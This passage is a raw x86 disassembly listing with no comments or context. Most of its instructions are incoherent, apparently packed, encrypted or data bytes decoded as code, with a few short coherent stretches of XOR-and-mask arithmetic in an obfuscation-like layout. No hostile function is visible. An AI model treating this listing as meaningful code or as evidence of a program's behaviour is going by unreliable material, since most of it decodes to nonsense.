  4020fb:	out    0x5a,eax
  4020fd:	jnp    0x4020b9
  4020ff:	lods   eax,DWORD PTR ds:[esi]
  402100:	inc    edx
  402101:	jle    0x402083
  402103:	scas   al,BYTE PTR es:[edi]
  402104:	popf   
  402105:	sbb    esp,ebx
  402107:	pusha  
  402108:	inc    edx
  402109:	shr    DWORD PTR [ecx+0x60],cl
  40210c:	dec    ebx
  40210d:	mov    WORD PTR [eax+eiz*4],cs
  402110:	arpl   WORD PTR [ecx+ecx*2+0x7e3f3e81],sp
  402117:	adc    eax,0xa0ac133
  40211c:	jmp    0x457dd998
  402121:	sar    BYTE PTR [eax+eax*8+0x51],0xf5
  402126:	fidivr DWORD PTR [ebp+0x2fa51e9a]
  40212c:	mov    eax,0xac77502d
  402131:	cdq    
  402132:	dec    ebx
  402133:	data16 mov ?,WORD PTR [ecx+0x42]
  402137:	aaa    
  402138:	mov    eax,0x2330553b
  40213d:	or     bh,bl
  40213f:	mov    WORD PTR [edi],gs
  402141:	xchg   ebx,eax
  402142:	std    
  402143:	loopne 0x402104
  402145:	jg     0x402169
  402147:	mov    dl,0xfe
  402149:	cmp    BYTE PTR [ebx+0x3c],0x62
  40214d:	xchg   esi,eax
  40214e:	lods   eax,DWORD PTR ds:[esi]
  40214f:	test   BYTE PTR [ecx+0x4c2910dc],dl
  402155:	fadd   QWORD PTR [esp+edi*4-0x53ce1fb8]
  40215c:	jb     0x4021dc
  40215e:	add    DWORD PTR [ebx+0x76],ecx
  402161:	aad    0xbc
  402163:	jmp    FWORD PTR [ecx-0x43c5e8a5]
  402169:	icebp  
  40216a:	rcl    DWORD PTR [edx+0x61],cl
  40216d:	pusha  
  40216e:	push   ds
  40216f:	cdq    
  402170:	(bad)  
  402171:	mov    esi,0xc4f257b6
  402176:	adc    ebx,eax
  402178:	cdq    
  402179:	fneni(8087 only) 
  40217b:	out    dx,al
  40217c:	ja     0x4021b7
  40217e:	outs   dx,BYTE PTR ds:[esi]
  40217f:	outs   dx,DWORD PTR ds:[esi]
  402180:	fs cs jmp 0x402163
  402184:	sti    
  402185:	jno    0x4021ec
  402187:	imul   edi,eax,0x7fe70dc
  40218d:	(bad)  
  40218f:	push   eax
  402190:	aad    0xd5
  402192:	pop    edx
  402193:	loopne 0x40216c
  402195:	mov    ah,0x72
  402197:	mov    ecx,0x904ed1ab
  40219c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40219d:	mov    edi,0xd7a977e2
  4021a2:	and    DWORD PTR [ecx+0x73],edx
  4021a5:	mov    edx,0x99089ca9
  4021aa:	pop    ss
  4021ab:	fwait
  4021ac:	rcr    BYTE PTR [ebx],0x4c
  4021af:	test   BYTE PTR [ebp+0xf],0x38
  4021b3:	ins    DWORD PTR es:[edi],dx
  4021b4:	jmp    0x2a22fd97
  4021b9:	test   esp,ebx
  4021bb:	int3   
  4021bc:	mov    al,ds:0x8a6b49ad
  4021c1:	pushf  
  4021c2:	jnp    0x4021fc
  4021c4:	mov    ebp,0xe2b94ae9
  4021c9:	push   es
  4021ca:	arpl   WORD PTR [edx+0x3a1edc04],ax
  4021d0:	ja     0x40219a
  4021d2:	pusha  
  4021d3:	dec    esi
  4021d4:	push   esp
  4021d5:	(bad)  
  4021d6:	into   
  4021d7:	add    bh,BYTE PTR [ebx+ebp*8]
  4021da:	sub    DWORD PTR [esi-0x57],ebx
  4021dd:	sti    
  4021de:	mov    DWORD PTR [esp+edx*2+0x44],ebp
  4021e2:	and    al,0x96
  4021e4:	imul   eax,DWORD PTR [esi],0x55
  4021e7:	add    bh,BYTE PTR [eax-0x46d50d76]
  4021ed:	stos   DWORD PTR es:[edi],eax
  4021ee:	jbe    0x402221
  4021f0:	es push edi
  4021f2:	iret   
  4021f3:	scas   eax,DWORD PTR es:[edi]
  4021f4:	cmp    esi,DWORD PTR [ebx+0x26eb64bb]
  4021fa:	scas   al,BYTE PTR es:[edi]
  4021fb:	lods   al,BYTE PTR ds:[esi]
  4021fc:	scas   eax,DWORD PTR es:[edi]
  4021fd:	stos   BYTE PTR es:[edi],al
  4021fe:	push   esp
  4021ff:	jl     0x402201
  402201:	(bad)  
  402202:	and    bh,BYTE PTR [ebx-0x7c]
  402205:	push   DWORD PTR [eax+0x5752157]
  40220b:	fimul  DWORD PTR [eax+esi*8+0x37]
  40220f:	pop    ds
  402210:	(bad)  
  402211:	call   0x6e3a72e2
  402216:	inc    BYTE PTR [ebx+0x63]
  402219:	dec    esp
  40221a:	rol    DWORD PTR [ecx+0x3d],1
  40221d:	in     al,dx
  40221e:	or     eax,0x73843f78
  402223:	push   ebp
  402224:	hlt    
  402225:	mov    bl,0x49
  402227:	outs   dx,DWORD PTR ds:[esi]
  402228:	(bad)  
  402229:	mov    ch,0x14
  40222b:	cmp    al,0x9f
  40222d:	fnsave [ebp+0x20]
  402230:	adc    eax,0x84ac3d76
  402235:	jge    0x402233
  402237:	jecxz  0x402258
  402239:	popa   
  40223a:	call   DWORD PTR [eax]
  40223c:	ins    DWORD PTR es:[edi],dx
  40223d:	je     0x4021e2
  40223f:	sbb    bl,bh
  402241:	push   ebx
  402242:	(bad)  
  402243:	fiadd  WORD PTR [esi+0x54]
  402246:	mov    ecx,0xbbe99dd2
  40224b:	xor    BYTE PTR [eax+0x4d8bda87],0xc
  402252:	xor    eax,esi
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x5c53acd6],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402259
  4022a2:	cli    
  4022a3:	popf   
  4022a4:	lock mov ?,WORD PTR [edx+0x18d3ebe4]
  4022ab:	mov    dl,0xb9
  4022ad:	scas   eax,DWORD PTR es:[edi]
  4022ae:	sbb    eax,0xb0977ba3
  4022b3:	les    esi,FWORD PTR [esi-0x55bfd224]
  4022b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022ba:	jno    0x4022e7
  4022bc:	out    0x74,eax
  4022be:	or     BYTE PTR [ebp-0x3593a58b],al
  4022c4:	or     DWORD PTR [eax],edx
  4022c6:	mov    esi,0xc4d33c1c
  4022cb:	retf   
  4022cc:	stos   DWORD PTR es:[edi],eax
  4022cd:	rcl    BYTE PTR [eax-0x79],0xd6
  4022d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d2:	iret   
  4022d3:	mov    dl,0x19
  4022d5:	and    bh,BYTE PTR [edx-0x2f]
  4022d8:	(bad)  
  4022da:	lods   eax,DWORD PTR ds:[esi]
  4022db:	jae    0x402331
  4022dd:	pop    edi
  4022de:	stos   BYTE PTR es:[edi],al
  4022df:	ins    DWORD PTR es:[edi],dx
  4022e0:	test   eax,0xeb89eb5d
  4022e5:	ret    0xebfd
  4022e8:	out    0xd2,al
  4022ea:	sbb    esi,DWORD PTR [esi+0xe54de42]
  4022f0:	rol    BYTE PTR [edx],0xce
  4022f3:	rcl    BYTE PTR [edi-0x6b],1
  4022f6:	je     0x4022a5
  4022f8:	push   esp
  4022f9:	jo     0x402302
  4022fb:	out    0xca,eax
  4022fd:	call   0x113:0x638f9e39
  402304:	sub    eax,0x11ec3b0a
  402309:	fiadd  DWORD PTR [edx+0x20]
  40230c:	jo     0x4022ed
  40230e:	inc    edx
  40230f:	loope  0x4022ef
  402311:	pop    eax
  402312:	or     bl,BYTE PTR [esi-0x42]
  402315:	push   0x404c4bbc
  40231a:	pop    ebp
  40231b:	out    dx,al
  40231c:	clc    
  40231d:	shr    BYTE PTR [eax+0x295e18c5],1
  402323:	xchg   ecx,eax
  402324:	mov    esp,DWORD PTR [ebp+ecx*8-0x64]
  402328:	inc    edi
  402329:	mov    al,0xd0
  40232b:	repz sbb DWORD PTR [esp+ebp*4+0xedaa96f],esp
  402333:	inc    edi
  402334:	pop    ds
  402335:	xlat   BYTE PTR ds:[ebx]
  402336:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402338:	xlat   BYTE PTR ds:[ebx]
  402339:	cmp    ch,BYTE PTR [ecx]
  40233b:	aas    
  40233c:	add    eax,0x77b43646
  402341:	je     0x40231e
  402343:	mov    eax,ds:0x24c9b3ad
  402348:	and    BYTE PTR [ebp-0x41],cl
  40234b:	jo     0x402334
  40234d:	cmp    eax,0x596e7aa5
  402352:	mov    ecx,ecx
  402354:	adc    eax,0x8bb1fb1b
  402359:	sbb    ebx,DWORD PTR [ebx+ebx*2-0x184cb412]
  402360:	push   ebx
  402361:	lahf   
  402362:	mov    dl,0xfe
  402364:	ror    DWORD PTR [ebx+0x7b],cl
  402367:	dec    DWORD PTR [ecx+0x79]
  40236a:	push   edx
  40236b:	cld    
  40236c:	cmp    DWORD PTR [ebx],edx
  40236e:	adc    eax,DWORD PTR [ecx-0x3f]
  402371:	and    eax,0x3ab15ff9
  402376:	xchg   BYTE PTR [edx+0x17b473a8],al
  40237c:	fild   DWORD PTR [edx]
  40237e:	inc    eax
  40237f:	xor    dh,cl
  402381:	xor    DWORD PTR [ebp-0x5696d8cf],edi
  402387:	adc    bl,BYTE PTR [ecx]
  402389:	scas   eax,DWORD PTR es:[edi]
  40238a:	sbb    eax,0xa028e2c8
  40238f:	mov    bl,0x2a
  402391:	ror    BYTE PTR [esi],1
  402393:	cs xchg ecx,eax
  402395:	rcl    DWORD PTR [edx+0x335bb324],1
  40239b:	call   0x5377b3f4
  4023a0:	or     BYTE PTR [esi-0x27ab2204],cl
  4023a6:	push   ebp
  4023a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023a8:	push   0x5bacf085
  4023ad:	iret   
  4023ae:	dec    esp
  4023af:	lock cs mov cl,0xcf
  4023b3:	outs   dx,BYTE PTR ds:[esi]
  4023b4:	and    al,0xcb
  4023b6:	mov    ecx,0x593af720
  4023bb:	mov    ecx,0xfd96284e
  4023c0:	sub    BYTE PTR [ebx+eax*4],ch
  4023c3:	call   0x6dc8:0x713a9286
  4023ca:	pop    ss
  4023cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023cc:	cmp    dh,0xa
  4023cf:	mov    ch,0xf2
  4023d1:	scas   eax,DWORD PTR es:[edi]
  4023d2:	mov    ebp,0x9f2cde2a
  4023d7:	rcl    edx,cl
  4023d9:	push   ss
  4023da:	sub    esi,edi
  4023dc:	add    eax,0x8d85a71e
  4023e1:	stos   DWORD PTR es:[edi],eax
  4023e2:	xor    eax,0x79
  4023e5:	das    
  4023e6:	aam    0x68
  4023e8:	(bad)  
  4023e9:	int3   
  4023ea:	dec    ebx
  4023eb:	pop    esi
  4023ec:	hlt    
  4023ed:	push   ecx
  4023ee:	popf   
  4023ef:	pop    ebx
  4023f0:	scas   eax,DWORD PTR es:[edi]
  4023f1:	sbb    DWORD PTR [edx-0xf3002f9],0x1a
  4023f8:	sub    ebp,eax
  4023fa:	sbb    DWORD PTR [ebx-0x5d],eax
  4023fd:	xchg   ebx,eax
  4023fe:	xchg   edi,eax
  4023ff:	sub    edi,DWORD PTR [edx]
  402401:	ja     0x40246f
  402403:	jne    0x402447
  402405:	xor    eax,0xf3af6318
  40240a:	ja     0x4023d2
  40240c:	cmp    BYTE PTR [eax-0x7a],0xb0
  402410:	add    al,BYTE PTR [esp+ebx*2]
  402413:	inc    edi
  402414:	push   edi
  402415:	or     dh,BYTE PTR [ebx]
  402417:	data16 jg 0x4023d3
  40241a:	pop    edx
  40241b:	stc    
  40241c:	sub    al,0xea
  40241e:	cmp    al,0xa0
  402420:	shr    DWORD PTR [edi],cl
  402422:	das    
  402423:	and    DWORD PTR [edx],0xb115bbb6
  402429:	mov    cl,BYTE PTR [edi-0x7b]
  40242c:	add    ecx,DWORD PTR [esp+eax*1]
  40242f:	cmp    DWORD PTR [eax],esp
  402431:	int    0x42
  402433:	push   eax
  402434:	mov    ebx,esi
  402436:	mov    ds,ecx
  402438:	loop   0x40247f
  40243a:	scas   eax,DWORD PTR es:[edi]
  40243b:	adc    al,0x6d
  40243d:	push   edi
  40243e:	jecxz  0x402495
  402440:	cld    
  402441:	push   esi
  402442:	int3   
  402443:	test   dl,0xa1
  402446:	xor    al,ah
  402448:	push   ds
  402449:	je     0x402478
  40244b:	(bad)  
  40244c:	and    eax,0xd5c48724
  402451:	scas   eax,DWORD PTR es:[edi]
  402452:	mov    cl,0x53
  402454:	adc    al,BYTE PTR [esi-0x58d7b9ab]
  40245a:	pop    esp
  40245b:	mov    ds:0x7cfe90eb,al
  402460:	and    ch,cl
  402462:	mov    ds:0x2a128001,al
  402467:	dec    esi
  402468:	inc    ebx
  402469:	sub    DWORD PTR [ebp-0x5becd5b2],ecx
  40246f:	fimul  DWORD PTR [ecx-0x71e366b7]
  402475:	mov    edi,0xba63ed1
  40247a:	and    eax,0x9ff4b648
  40247f:	push   es
  402480:	sub    edi,DWORD PTR [eax+0x35]
  402483:	mov    gs,WORD PTR [edi+0xa]
  402486:	jmp    0xc340:0x12a1ee9e
  40248d:	push   ss
  40248e:	cmp    al,0x7d
  402490:	aad    0xec
  402492:	gs je  0x4024ba
  402495:	jns    0x402423
  402497:	lea    sp,[edi+esi*1]
  40249b:	mov    bh,0x0
  40249d:	imul   edx,DWORD PTR [eax-0x2a75b9fa],0x4f
  4024a4:	sahf   
  4024a5:	ret    
  4024a6:	shl    esp,1
  4024a8:	adc    ecx,DWORD PTR [ebp+0x849fd6]
  4024ae:	adc    al,BYTE PTR ds:0x6ff1a31d
  4024b4:	xor    DWORD PTR [ecx-0x3aba0dfa],edx
  4024ba:	dec    edi
  4024bb:	repz jmp 0xad21:0xb371b65d
  4024c3:	fmulp  st(7),st
  4024c5:	mov    ?,WORD PTR [ecx+0x60]
  4024c8:	xchg   esp,eax
  4024c9:	add    bl,al
  4024cb:	repnz mov cl,bh
  4024ce:	mov    fs,WORD PTR [edx-0x14425c8a]
  4024d4:	or     al,0xce
  4024d6:	into   
  4024d7:	int    0x4d
  4024d9:	repnz cli 
  4024db:	or     DWORD PTR [edx],edi
  4024dd:	aad    0x39
  4024df:	jecxz  0x40253b
  4024e1:	adc    eax,0x182319bd
  4024e6:	lahf   
  4024e7:	retf   0x5b39
  4024ea:	jp     0x40250e
  4024ec:	mov    cl,0x2f
  4024ee:	in     eax,dx
  4024ef:	div    DWORD PTR [edi]
  4024f1:	stos   BYTE PTR es:[edi],al
  4024f2:	mov    ch,BYTE PTR [ecx+ecx*4+0x7]
  4024f6:	jl     0x40256f
  4024f8:	inc    eax
  4024f9:	fmul   QWORD PTR [eax+0x47a5d9e3]
  4024ff:	adc    esp,DWORD PTR [edx-0x13]
  402502:	in     eax,dx
  402503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402504:	cmp    esi,DWORD PTR [ebp+0x7c18c5a1]
  40250a:	push   ecx
  40250b:	jne    0x4024a2
  40250d:	and    eax,0x426860e3
  402512:	sub    al,0x47
  402514:	pop    ebx
  402515:	dec    edx
  402516:	pop    esi
  402517:	xor    BYTE PTR [esi],dh
  402519:	out    dx,eax
  40251a:	mov    ecx,0xcb5796f1
  40251f:	inc    ecx
  402520:	je     0x402563
  402522:	mov    ah,ah
  402524:	xchg   DWORD PTR [ebp-0x30524082],esi
  40252a:	neg    eax
  40252c:	lock nop
  40252e:	pop    edi
  40252f:	dec    esp
  402530:	mov    ecx,0x47f91634
  402535:	rcr    DWORD PTR [edi+0xf453f90],1
  40253b:	ss scas eax,DWORD PTR es:[edi]
  40253d:	sub    bh,BYTE PTR [edi]
  40253f:	out    0xe2,eax
  402541:	inc    ecx
  402542:	sbb    ebp,DWORD PTR [ecx+0x5697f60f]
  402548:	cld    
  402549:	jnp    0x4025a1
  40254b:	retf   0x848
  40254e:	push   0xffffffdf
  402550:	jl     0x402529
  402552:	push   es
  402553:	sbb    al,0x5
  402555:	jae    0x402517
  402557:	push   ecx
  402558:	lea    ebx,[edx+0x29]
  40255b:	xchg   ebp,eax
  40255c:	mov    ecx,0xf8da0e3a
  402561:	pop    edx
  402562:	push   cs
  402563:	cmc    
  402564:	cmp    cl,dl
  402566:	and    bh,dh
  402568:	jmp    0x7476f565
  40256d:	sbb    BYTE PTR [ebx+0x5f],al
  402570:	test   al,0xd2
  402572:	sbb    BYTE PTR [ebp-0x7a],ah
  402575:	shl    BYTE PTR [esi+0x7ae7307f],cl
  40257b:	cmp    DWORD PTR [ebx+0x1e09bf33],ebx
  402581:	popa   
  402582:	pop    ss
  402583:	mov    DWORD PTR [edi],edx
  402585:	out    dx,eax
  402586:	inc    edi
  402587:	and    eax,0xc633f241
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	xor    al,0x58
  4025af:	xor    eax,eax
  4025b1:	jmp    0x7c7e:0x677c7c0f
  4025b8:	jl     0x4025a5
  4025ba:	retf   0x162d
  4025bd:	ins    BYTE PTR es:[edi],dx
  4025be:	or     bl,BYTE PTR [ebp+0x67]
  4025c1:	mov    dl,0xe2
  4025c3:	aad    0xe8
  4025c5:	jns    0x402578
  4025c7:	leave  
  4025c8:	dec    esi
  4025c9:	or     DWORD PTR [edi-0x38],esi
  4025cc:	out    0x35,al
  4025ce:	mov    ch,0x9a
  4025d0:	scas   eax,DWORD PTR es:[edi]
  4025d1:	ss out 0x9a,al
  4025d4:	ffreep st(1)
  4025d6:	ror    DWORD PTR [edx+eiz*8+0x7a],cl
  4025da:	and    esp,ebp
  4025dc:	jecxz  0x4025bd
  4025de:	inc    esp
  4025df:	daa    
  4025e0:	sbb    eax,0x55367bb2
  4025e5:	xchg   BYTE PTR [ecx+0x28],bh
  4025e8:	inc    esp
  4025e9:	add    bl,BYTE PTR [ebp-0x6458961]
  4025ef:	cmp    ebx,edi
  4025f1:	js     0x40263c
  4025f3:	mov    bh,0x76
  4025f5:	mov    edx,0xbd91d93c
  4025fa:	inc    eax
  4025fb:	or     BYTE PTR [edi],cl
  4025fd:	push   0x21
  4025ff:	jle    0x40266b
  402601:	or     esi,esi
  402603:	xchg   esp,eax
  402604:	xchg   ebx,esi
  402606:	dec    edi
  402607:	in     al,0x62
  402609:	mov    edi,0xfc413a85
  40260e:	sbb    eax,0x8373a552
  402613:	mov    BYTE PTR [ebx-0x2c],dl
  402616:	mov    ecx,0xca07dd56
  40261b:	fistp  DWORD PTR [esi-0x38]
  40261e:	push   ecx
  40261f:	test   eax,0x8d476b8d
  402624:	mov    bh,0x9f
  402626:	pop    ebp
  402627:	inc    eax
  402628:	call   0x996e:0x795dbf82
  40262f:	mov    edi,0x9f94a80b
  402634:	pop    edi
  402635:	inc    ebx
  402636:	jmp    0x5aee:0xda74ae42
  40263d:	aad    0x61
  40263f:	(bad)  
  402640:	test   DWORD PTR [edi-0x79],0x29ad7c7f
  402647:	aam    0x9b
  402649:	sbb    eax,0x892b7229
  40264e:	repz jbe 0x40266e
  402651:	retf   
  402652:	scas   eax,DWORD PTR es:[edi]
  402653:	mov    al,BYTE PTR [ebp-0x29ffec9a]
  402659:	pop    ebp
  40265a:	loop   0x4026b2
  40265c:	test   eax,0x806009d0
  402661:	das    
  402662:	shl    ecx,1
  402664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402665:	jg     0x402692
  402667:	jl     0x4026ab
  402669:	adc    ah,BYTE PTR [ecx-0x5f]
  40266c:	mov    al,0x58
  40266e:	(bad)  
  40266f:	shl    esp,cl
  402671:	daa    
  402672:	fbld   TBYTE PTR [edi+ebp*4-0x7d1e0054]
  402679:	loop   0x4026b9
  40267b:	xchg   edx,eax
  40267c:	rol    bh,0x40
  40267f:	shl    DWORD PTR [ecx-0x25fd4589],cl
  402685:	push   ss
  402686:	sbb    eax,0xd254ab09
  40268b:	mov    ecx,0x6aa229c0
  402690:	sti    
  402691:	pop    ebp
  402692:	outs   dx,BYTE PTR ds:[esi]
  402693:	in     eax,0x51
  402695:	stos   BYTE PTR es:[edi],al
  402696:	cld    
  402697:	sub    bh,BYTE PTR gs:[esi+0x53]
  40269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269c:	iret   
  40269d:	in     eax,0xbc
  40269f:	sub    BYTE PTR [edi+0x37c2370e],ch
  4026a5:	xor    al,0xe7
  4026a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a8:	sbb    eax,0x95a69146
  4026ad:	and    eax,0x68214bc7
  4026b2:	inc    esi
  4026b3:	ds aad 0x5
  4026b6:	(bad)  
  4026b7:	sbb    eax,0x67a58220
  4026bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026bd:	mov    edi,0x799bd17b
  4026c2:	(bad)  
  4026c3:	xor    ch,BYTE PTR [esi]
  4026c5:	mov    dh,0x38
  4026c7:	pushf  
  4026c8:	sub    BYTE PTR [esi+0x7d],dh
  4026cb:	xchg   edi,eax
  4026cc:	retf   
  4026cd:	int    0xa3
  4026cf:	pop    edi
  4026d0:	sbb    DWORD PTR [ebp+0x62e7e8ee],ecx
  4026d6:	mov    BYTE PTR [eax-0x227de684],cl
  4026dc:	xor    DWORD PTR [esp+eiz*8],ebx
  4026df:	sar    BYTE PTR ds:0x214749b3,0xc1
  4026e6:	add    al,0x6
  4026e8:	(bad)  
  4026e9:	aaa    
  4026ea:	cmp    al,0x84
  4026ec:	mov    al,ds:0x498d3b3b
  4026f1:	sbb    bh,ch
  4026f3:	rcr    BYTE PTR [ebx],0xf9
  4026f6:	mov    ch,0x5
  4026f8:	les    edi,FWORD PTR [edi-0x24]
  4026fb:	cld    
  4026fc:	xor    ebx,DWORD PTR [ebx+edx*8-0x1c]
  402700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402701:	sbb    al,0x18
  402703:	adc    al,0xcd
  402705:	pop    esp
  402706:	jg     0x40270a
  402708:	popa   
  402709:	xor    DWORD PTR [edx+0x37],esp
  40270c:	jge    0x402724
  40270e:	xchg   dh,cl
  402710:	xchg   DWORD PTR [edx+0x68],edi
  402713:	jnp    0x402787
  402715:	(bad)  
  402716:	cmp    DWORD PTR [ebp+ecx*1-0x7f3d6711],ebx
  40271d:	sbb    ebx,DWORD PTR [eax]
  40271f:	xlat   BYTE PTR ds:[ebx]
  402720:	sub    eax,0xb3d4af6b
  402725:	jb     0x402722
  402727:	cmp    edi,DWORD PTR [esi+0x2c]
  40272a:	jg     0x4026cf
  40272c:	jp     0x4026cf
  40272e:	popf   
  40272f:	cli    
  402730:	xchg   esi,eax
  402731:	add    BYTE PTR [ebx],bh
  402733:	pop    ebp
  402734:	outs   dx,BYTE PTR ds:[esi]
  402735:	mov    esp,0x34ca46ac
  40273a:	test   eax,0x16ce75e4
  40273f:	mov    edx,0x8a0978a9
  402744:	pushf  
  402745:	add    cl,BYTE PTR [eax+0x4b4062]
  40274b:	push   ecx
  40274c:	daa    
  40274d:	xor    DWORD PTR [edi+ebx*1+0x61],ebp
  402751:	sub    cl,bl
  402753:	sahf   
  402754:	adc    al,0x58
  402756:	adc    ebx,DWORD PTR [ebx]
  402758:	repnz in al,0xe0
  40275b:	xor    al,0x66
  40275d:	or     al,dh
  40275f:	sbb    al,0x8c
  402761:	xor    al,0xff
  402763:	adc    BYTE PTR [ebp-0xfa5cca3],bh
  402769:	mov    ds:0x77c0426,al
  40276e:	(bad)  
  40276f:	shl    bl,1
  402771:	rol    BYTE PTR [ebx],1
  402773:	xchg   esp,eax
  402774:	fnsave [ebx-0x68]
  402777:	leave  
  402778:	repnz (bad) 
  40277a:	mov    dl,0xbd
  40277c:	(bad)  
  40277d:	dec    eax
  40277e:	out    dx,al
  40277f:	sub    DWORD PTR [esi+0x5eb09df6],ebx
  402785:	and    al,0xb9
  402787:	retf   0x6d43
  40278a:	cmp    eax,0x46dc4b9
  40278f:	or     eax,0xaf5f9b88
  402794:	retf   
  402795:	lock mov DWORD PTR [ebx+edi*8-0x70],edx
  40279a:	aad    0x22
  40279c:	pop    ebp
  40279d:	push   esi
  40279e:	adc    eax,0xf468ad3a
  4027a3:	cmp    eax,0x18e7f85d
  4027a8:	loopne 0x4027e7
  4027aa:	das    
  4027ab:	adc    eax,0xf9e73383
  4027b0:	stos   DWORD PTR es:[edi],eax
  4027b1:	lods   al,BYTE PTR ds:[esi]
  4027b2:	shl    DWORD PTR [eax-0x3b37459],cl
  4027b8:	jmp    0x214588ec
  4027bd:	mov    ds:0x54f33bb7,al
  4027c2:	shl    BYTE PTR [esi],1
  4027c4:	push   ds
  4027c5:	dec    esi
  4027c6:	xor    ebx,esi
  4027c8:	jl     0x402801
  4027ca:	(bad)  
  4027cb:	cs mov esi,0xc6bbf8f0
  4027d1:	gs in  al,0xba
  4027d4:	outs   dx,DWORD PTR ds:[esi]
  4027d5:	mov    ?,WORD PTR ds:0x64336d39
  4027db:	adc    edi,esp
  4027dd:	xchg   edi,eax
  4027de:	jbe    0x402769
  4027e0:	dec    eax
  4027e1:	stos   BYTE PTR es:[edi],al
  4027e2:	call   0xae2f:0xbfc80f95
  4027e9:	test   al,0x9
  4027eb:	leave  
  4027ec:	rcr    esp,1
  4027ee:	faddp  st(3),st
  4027f0:	out    0xae,eax
  4027f2:	lea    esp,[edi+0x54]
  4027f5:	mov    esi,0x2e66771f
  4027fa:	jmp    0xf02e:0x6edd75e7
  402801:	outs   dx,DWORD PTR ds:[esi]
  402802:	mov    edx,0x5cf41964
  402807:	or     al,0x7f
  402809:	dec    ebp
  40280a:	dec    ebx
  40280b:	sti    
  40280c:	hlt    
  40280d:	mov    esp,0xe423795f
  402812:	sub    DWORD PTR [ebx-0x43408cf4],0xacf63966
  40281c:	sub    ecx,edi
  40281e:	mov    ebp,0xa5808d34
  402823:	push   edi
  402824:	push   0xdfaa1028
  402829:	sbb    eax,0x8c5af589
  40282e:	or     ch,BYTE PTR [esi+0x2a]
  402831:	or     eax,0x33f2517f
  402836:	imul   edi,DWORD PTR [edx+0x41f84769],0xfffffff2
  40283d:	inc    ebp
  40283e:	jb     0x4027cf
  402840:	test   DWORD PTR ds:0x9944d504,ecx
  402846:	in     eax,0x30
  402848:	pushf  
  402849:	mov    ecx,0x2d873c25
  40284e:	ja     0x40281d
  402850:	mov    ebp,0x19230748
  402855:	ins    BYTE PTR es:[edi],dx
  402856:	test   al,0xf8
  402858:	pop    ecx
  402859:	cmp    dl,ch
  40285b:	pushf  
  40285c:	xor    esi,DWORD PTR [ebp+ebp*8+0xed07c44]
  402863:	das    
  402864:	in     al,dx
  402865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402866:	pop    es
  402867:	mov    eax,0x143d647b
  40286c:	popa   
  40286d:	ins    BYTE PTR es:[edi],dx
  40286e:	(bad)  
  40286f:	stc    
  402870:	mov    ecx,0x98de1786
  402875:	js     0x4028ac
  402877:	cdq    
  402878:	mov    ebx,DWORD PTR [ecx-0x10]
  40287b:	jg     0x402829
  40287d:	and    BYTE PTR [ebx+0x18],dh
  402880:	inc    edi
  402881:	push   0x2cbbb653
  402886:	cmp    DWORD PTR [edx+0x27],ebx
  402889:	dec    edx
  40288a:	dec    esi
  40288b:	clc    
  40288c:	retf   0xb0a2
  40288f:	push   ebp
  402890:	dec    esp
  402891:	pop    edx
  402892:	adc    BYTE PTR [esi+0x65],bl
  402895:	retf   
  402896:	add    bh,0x9e
  402899:	test   BYTE PTR [edx+0x21edb483],0xd
  4028a0:	sub    al,0x82
  4028a2:	je     0x4028b6
  4028a8:	mov    eax,DWORD PTR [ebp-0x8]
  4028ab:	mov    DWORD PTR [eax],0x60341e8d
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	mov    ah,BYTE PTR [ebx]
  4028e3:	rcr    BYTE PTR [ebx-0x23],1
  4028e6:	or     BYTE PTR [esp+edi*2+0x67],bh
  4028ea:	jle    0x402968
  4028ec:	jl     0x402870
  4028ee:	push   es
  4028ef:	sbb    esp,ebp
  4028f1:	dec    esi
  4028f2:	add    BYTE PTR [edi],bh
  4028f4:	ss nop
  4028f6:	pop    edx
  4028f7:	aad    0xe1
